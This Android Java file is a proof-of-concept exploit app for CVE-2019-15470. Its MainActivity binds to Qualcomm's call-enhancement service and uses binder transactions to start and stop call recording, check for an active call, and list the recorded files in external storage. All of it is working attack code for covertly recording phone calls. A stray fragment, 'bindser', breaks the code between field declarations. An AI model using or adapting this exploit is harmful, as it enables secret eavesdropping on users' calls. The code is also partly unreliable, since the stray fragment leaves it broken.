package com.example.cve_2019_15470;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.File;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private Button start_button;
    private Button stop_button;
    private Button canCallRecord_button;
    private Button external_storage_button;
    private Button bind_button;
    private TextView text;

    private MyServiceConnect myServiceConnect = new MyServiceConnect();
    private static String sCallRecordPath = (Environment.getExternalStorageDirectory() + File.separator + "CallRecord");
bindser
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        text = (TextView)findViewById(R.id.textView);

        bind_button = (Button)findViewById(R.id.bind_service);
        bind_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.qualcomm.qti.callenhancement", "com.qualcomm.qti.callenhancement.CallEnhancementService"));
                boolean a = bindService(intent, myServiceConnect, BIND_AUTO_CREATE);
                Log.i("Stat_Info", "Bind状态：；" + a);
                text.setText("Bind: " + a);
            }
        });

        canCallRecord_button = (Button)findViewById(R.id.canCallRecord);
        canCallRecord_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                int stat = hasAnyActiveCall();
                text.setText("hasAnyActiveCall: " + stat);
            }
        });

        start_button = (Button)findViewById(R.id.start_button);
        start_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                start_recorder();
            }
        });

        stop_button = (Button)findViewById(R.id.stop_button);
        stop_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                stop_recorder();
            }
        });

        external_storage_button = (Button)findViewById(R.id.pub_storage_button);
        external_storage_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                modify_text_external();
            }
        });

   }

   protected String start_recorder(){
        return myServiceConnect.transact(1);
   }

    protected String stop_recorder(){
        return myServiceConnect.transact(2);
    }

    protected int hasAnyActiveCall(){
        return myServiceConnect.transact_int(5);
    }

    protected void modify_text_external(){
        File File = new File(sCallRecordPath);
        File[] files = File.listFiles();
        ArrayList<String> filenames = new ArrayList<String>();
        if (files != null){
            for (int i=0; i<files.length; i++){
                filenames.add(files[i].getName());
            }
        }
        text.setText(filenames.toString());
    }
}